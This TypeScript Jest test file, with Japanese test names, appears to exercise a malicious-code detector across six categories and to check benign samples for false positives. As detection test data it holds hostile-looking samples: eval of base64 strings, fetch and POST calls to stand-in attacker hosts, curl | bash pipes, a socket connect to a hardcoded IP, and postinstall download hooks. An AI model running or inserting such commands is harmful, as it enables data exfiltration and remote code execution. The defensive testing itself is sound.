import { detectMaliciousCode } from './maliciousCodeDetector'

describe('detectMaliciousCode() 陽性テスト（6カテゴリ×2件以上）', () => {
  describe('encoded_execution', () => {
    test('eval(atob(...)) を検知', () => {
      const result = detectMaliciousCode('eval(atob("Y29uc29sZS5sb2coMSk="))')
      expect(result.matched).toBe(true)
      expect(result.category).toBe('encoded_execution')
    })

    test('new Function(atob(...)) を検知', () => {
      const result = detectMaliciousCode('const f = new Function(atob("cmV0dXJuIDE7"))')
      expect(result.matched).toBe(true)
      expect(result.category).toBe('encoded_execution')
    })

    test('Buffer.from(base64).toString → eval を検知', () => {
      const result = detectMaliciousCode(
        'const c = Buffer.from(payload, "base64").toString("utf-8"); eval(c)'
      )
      expect(result.matched).toBe(true)
      expect(result.category).toBe('encoded_execution')
    })
  })

  describe('network_exfiltration', () => {
    test('未知ドメインへのfetchを検知', () => {
      const result = detectMaliciousCode('fetch("https://evil-exfil.example.net/collect")')
      expect(result.matched).toBe(true)
      expect(result.category).toBe('network_exfiltration')
    })

    test('未知ドメインへのXMLHttpRequestを検知', () => {
      const result = detectMaliciousCode(
        'const x = new XMLHttpRequest(); x.open("POST", "https://attacker.example.com/log")'
      )
      expect(result.matched).toBe(true)
      expect(result.category).toBe('network_exfiltration')
    })
  })

  describe('pipe_execution', () => {
    test('curl | bash 型パイプ実行を検知', () => {
      const result = detectMaliciousCode('curl https://example.com/install.sh | bash')
      expect(result.matched).toBe(true)
      expect(result.category).toBe('pipe_execution')
    })

    test('wget -O - | sh 型パイプ実行を検知', () => {
      const result = detectMaliciousCode('wget -O - https://example.com/x.sh | sh')
      expect(result.matched).toBe(true)
      expect(result.category).toBe('pipe_execution')
    })
  })

  describe('hardcoded_ip_exfiltration', () => {
    test('ハードコードIPへのURL送信を検知', () => {
      const result = detectMaliciousCode('const target = "http://203.0.113.42:8080/collect"; sendData(target)')
      expect(result.matched).toBe(true)
      expect(result.category).toBe('hardcoded_ip_exfiltration')
    })

    test('socket.connectでのハードコードIP接続を検知', () => {
      const result = detectMaliciousCode('socket.connect(4444, "198.51.100.7")')
      expect(result.matched).toBe(true)
      expect(result.category).toBe('hardcoded_ip_exfiltration')
    })
  })

  describe('suspicious_postinstall', () => {
    test('postinstallでのcurl実行を検知', () => {
      const result = detectMaliciousCode('"postinstall": "curl https://example.com/x.sh -o /tmp/x.sh"')
      expect(result.matched).toBe(true)
      expect(result.category).toBe('suspicious_postinstall')
    })

    test('postinstallでのnode -e実行を検知', () => {
      const result = detectMaliciousCode('"postinstall": "node -e \\"require(\'fs\').writeFileSync(1)\\""')
      expect(result.matched).toBe(true)
      expect(result.category).toBe('suspicious_postinstall')
    })
  })

  describe('obfuscation', () => {
    test('String.fromCharCodeの16進羅列による難読化を検知', () => {
      const result = detectMaliciousCode(
        'String.fromCharCode(0x61, 0x6c, 0x65, 0x72, 0x74, 0x28)'
      )
      expect(result.matched).toBe(true)
      expect(result.category).toBe('obfuscation')
    })

    test('eval(unescape(%XX...)) による難読化を検知', () => {
      const result = detectMaliciousCode('eval(unescape("%61%6c%65%72%74%28%31%29"))')
      expect(result.matched).toBe(true)
      expect(result.category).toBe('obfuscation')
    })
  })
})

describe('detectMaliciousCode() 陰性コーパス（良性コード20件以上、誤検知ゼロ）', () => {
  const benignSamples: string[] = [
    'function add(a: number, b: number): number { return a + b }',
    'const users = await fetch("https://api.anthropic.com/v1/messages")',
    'const res = await fetch("http://localhost:8787/health")',
    'const res = await fetch("http://127.0.0.1:3000/api/data")',
    'export const greet = (name: string) => `Hello, ${name}!`',
    'import { useState } from "react"\nconst [count, setCount] = useState(0)',
    'const data = JSON.parse(rawJson)',
    'const encoded = btoa("hello world")',
    'const decoded = Buffer.from("aGVsbG8=", "base64").toString("utf-8")',
    'console.log("debug:", value)',
    'app.get("/health", (c) => c.json({ status: "ok" }))',
    'const sorted = [3, 1, 2].sort((a, b) => a - b)',
    'class Point { constructor(public x: number, public y: number) {} }',
    'const total = items.reduce((sum, item) => sum + item.price, 0)',
    'npm install lodash --save',
    '"scripts": { "build": "tsc", "test": "jest" }',
    'const ip = "127.0.0.1"; console.log(`Server running at ${ip}`)',
    'for (let i = 0; i < 10; i++) { console.log(i) }',
    'try { doSomething() } catch (e) { console.error(e) }',
    'const regex = /^[a-z0-9]+$/i',
    'export interface User { id: string; name: string; email: string }',
    'const promise = new Promise((resolve) => setTimeout(resolve, 1000))',
    'git clone https://github.com/anthropics/claude-code.git',
    'SELECT * FROM users WHERE id = ?',
  ]

  test.each(benignSamples)('誤検知しない: %s', (sample) => {
    const result = detectMaliciousCode(sample)
    expect(result.matched).toBe(false)
  })

  test('良性コーパスは20件以上ある', () => {
    expect(benignSamples.length).toBeGreaterThanOrEqual(20)
  })
})
